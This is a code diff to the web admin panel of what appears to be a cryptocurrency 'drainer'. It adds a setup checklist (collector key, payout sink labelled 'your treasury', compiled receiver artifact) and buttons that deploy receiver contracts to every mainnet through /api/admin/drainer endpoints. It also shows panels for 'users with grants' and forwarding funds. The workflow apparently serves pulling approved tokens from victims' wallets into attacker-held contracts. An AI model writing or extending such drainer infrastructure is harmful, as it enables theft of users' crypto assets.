@@ -68,6 +68,20 @@
 
 <div id="warn"></div>
 
+<h2>Setup</h2>
+<p class="muted">Everything the drainer needs to move funds. Keys and payout are
+   super-admin only; a chain cannot be pulled until its receiver is deployed there.</p>
+<div id="setup" class="grid"></div>
+<div class="row" style="margin-top:10px">
+  <button class="ghost" id="compile">Compile receiver artifact</button>
+  <button class="ghost" id="deployall">Deploy missing receivers (all mainnets)</button>
+</div>
+
+<h2>Receiver contracts</h2>
+<p class="muted">Owner is the collector key; payout is your treasury. A green chip means
+   code is present and owner/payout match. Deploy per chain below or all at once above.</p>
+<div class="grid" id="receivers"></div>
+
 <h2>Status</h2>
 <div class="grid" id="status"></div>
 
@@ -130,11 +144,6 @@
   <button class="ghost" id="reveal" type="button">Show</button>
   <button id="key">Set key</button>
 </div>
-
-<h2>Receiver contracts</h2>
-<p class="muted">Deploy with <span class="mono">python scripts/deploy_receiver.py</span>.
-   A chain without a receiver cannot take EVM tokens.</p>
-<div class="grid" id="receivers"></div>
 
 <h2>Users with grants</h2>
 <table>
@@ -284,18 +293,51 @@ function renderStatus(d) {
     : "";
 }
 
-function renderReceivers(networks) {
-  const rows = networks || [];
+function chip(label, value, cls) {
+  return `<div class="chip"><span class="muted">${esc(label)}</span>
+    <b class="${cls ? `pill ${cls}` : "muted"}">${esc(value)}</b></div>`;
+}
+
+function renderSetup(d) {
+  const blockers = [];
+  if (!d.evm_key_set) blockers.push("No EVM collector key — set one below.");
+  if (!d.payout || !d.payout.startsWith("0x")) blockers.push("No valid EVM payout sink — save one below.");
+  if (!d.artifact) blockers.push("Receiver artifact missing — click Compile.");
+  if ((d.missing_mainnets || []).length) {
+    blockers.push(`No receiver on ${d.missing_mainnets.length} mainnet(s) — deploy below.`);
+  }
+  $("setup").innerHTML =
+    chip("Zap EVM collector", d.evm_key_set ? "set" : "missing", d.evm_key_set ? "on" : "off") +
+    chip("Payout sink", d.payout || "unset", d.payout && d.payout.startsWith("0x") ? "on" : "off") +
+    chip("Receiver artifact", d.artifact ? "compiled" : "missing", d.artifact ? "on" : "off") +
+    chip("Ready", d.ready && d.artifact ? "yes" : "no", d.ready && d.artifact ? "on" : "off");
+  $("warn").innerHTML = blockers.length
+    ? `<div class="warnbox">${blockers.map(esc).join("<br>")}</div>` : "";
+}
+
+function renderReceivers(chains) {
+  const rows = chains || [];
   if (!rows.length) {
     $("receivers").innerHTML = `<div class="empty">No EVM networks registered.</div>`;
     return;
   }
   $("receivers").innerHTML = rows.map((n) => {
-    const addr = n.receiver;
+    const state = n.deployed
+      ? (n.owner_ok && n.payout_ok ? ["on", "ok"] : ["mid", "mismatch"])
+      : ["off", "none"];
+    const addr = n.receiver ? `${n.receiver.slice(0, 6)}…${n.receiver.slice(-4)}` : "";
     return `<div class="chip">
       <span class="muted">${esc(n.name)} <b>#${esc(n.chainId)}${n.testnet ? " · test" : ""}</b></span>
-      <b class="mono">${addr ? esc(`${addr.slice(0, 6)}…${addr.slice(-4)}`) : "none"}</b></div>`;
+      <span style="display:flex;gap:6px;align-items:center">
+        ${addr ? `<b class="mono">${esc(addr)}</b>` : ""}
+        <b class="pill ${state[0]}">${esc(state[1])}</b>
+        <button class="ghost" data-deploy="${esc(n.name)}"
+          ${n.testnet ? "disabled title='mainnets only'" : ""}>Deploy</button>
+      </span></div>`;
   }).join("");
+
+  $("receivers").querySelectorAll("[data-deploy]").forEach((b) =>
+    b.onclick = () => deployOne(b.dataset.deploy, b));
 }
 
 function renderEvents(events) {
@@ -547,15 +589,82 @@ async function setKey() {
   }
 }
 
+async function deployOne(net, btn) {
+  if (busy) return;
+  busy = true;
+  const was = btn.textContent;
+  btn.textContent = "…";
+  btn.disabled = true;
+  try {
+    const r = await api(`/api/admin/drainer/receiver/${encodeURIComponent(net)}/deploy`,
+      { method: "POST", body: "{}" });
+    toast(`Receiver deployed on ${r.network}: ${r.address}`, "ok");
+  } catch (e) {
+    toast(`${net}: ${e.message}`, "bad");
+  } finally {
+    busy = false;
+    btn.textContent = was;
+    btn.disabled = false;
+    refresh();
+  }
+}
+
+async function compileArtifact() {
+  if (busy) return;
+  busy = true;
+  try {
+    await api("/api/admin/drainer/receiver/compile", { method: "POST", body: "{}" });
+    toast("Receiver artifact compiled.", "ok");
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+    refresh();
+  }
+}
+
+async function deployAll() {
+  if (busy) return;
+  if (!confirm("Deploy the receiver to every mainnet missing one?\n\nEach chain spends "
+    + "collector gas and takes ~30–90s.")) return;
+  busy = true;
+  try {
+    const r = await api("/api/admin/drainer/receiver/deploy-all", { method: "POST", body: "{}" });
+    const ok = (r.results || []).filter((x) => x.ok).length;
+    const bad = (r.results || []).length - ok;
+    toast(`Deployed ${ok}, failed ${bad}.`, bad ? "bad" : "ok");
+  } catch (e) {
+    toast(e.message, "bad");
+  } finally {
+    busy = false;
+    refresh();
+  }
+}
+
 async function refresh() {
+  let ov = null;
   try {
     const d = await api("/api/admin/drainer/overview");
     if (!settingsLoaded) fillSettings(d.settings);
     renderStatus(d);
-    renderReceivers(d.settings.evm_networks);
     renderEvents(d.events);
+    ov = d;
   } catch (e) {
     toast(e.message, "bad");
+  }
+
+  try {
+    const s = await api("/api/admin/drainer/setup");
+    renderSetup(s);
+    renderReceivers(s.chains);
+  } catch (e) {
+    if (e.message && /permission|403/i.test(e.message)) {
+      $("setup").innerHTML = `<div class="empty">Setup detail needs a super admin; ` +
+        `showing deployed receivers only.</div>`;
+      renderReceivers((ov && ov.settings.evm_networks) || []);
+    } else {
+      $("setup").innerHTML = `<div class="empty">${esc(e.message)}</div>`;
+    }
   }
 
   try {
@@ -567,6 +676,8 @@ async function refresh() {
 $("save").onclick = saveSettings;
 $("savepayout").onclick = savePayout;
 $("forwardnow").onclick = forwardNow;
+$("compile").onclick = compileArtifact;
+$("deployall").onclick = deployAll;
 $("key").onclick = setKey;
 $("reveal").onclick = () => {
   const f = $("secret");
